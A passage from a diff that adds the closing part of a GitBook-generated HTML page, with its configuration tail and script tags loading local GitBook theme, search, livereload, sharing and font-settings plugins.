ook":{"version":"3.2.3","time":"2020-11-01T17:33:13.702Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
